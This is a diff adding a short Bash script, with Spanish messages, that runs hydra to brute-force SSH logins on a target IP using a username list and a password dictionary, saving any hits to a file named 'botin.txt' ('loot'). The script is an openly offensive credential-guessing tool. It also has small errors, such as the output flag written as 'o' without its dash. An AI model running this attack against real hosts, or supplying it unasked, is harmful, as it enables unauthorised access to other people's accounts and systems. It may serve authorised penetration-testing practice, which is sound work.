@@ -1,0 +1,24 @@
+#!/bin/bash
+IP_OBJETIVO=$1
+
+USUARIOS="nombres_encontrados.txt"
+DICCIONARIO="password.txt"
+
+if [[ ! -f $USUARIOS ]] || [[ ! -f $DICCIONARIO ]]; then 
+    echo "[-] Error: No se encontro las listas de los nombres claves"
+    exit 1
+
+fi
+
+hydra -L $USUARIOS -P $DICCIONARIO $IP_OBJETIVO ssh -t 4 -V o botin.txt
+
+if [ -f botin.txt ]; then
+
+echo"Contraseña encontrada"
+
+else
+echo "No se encontraron"
+
+fi
+
+echo "hecho"
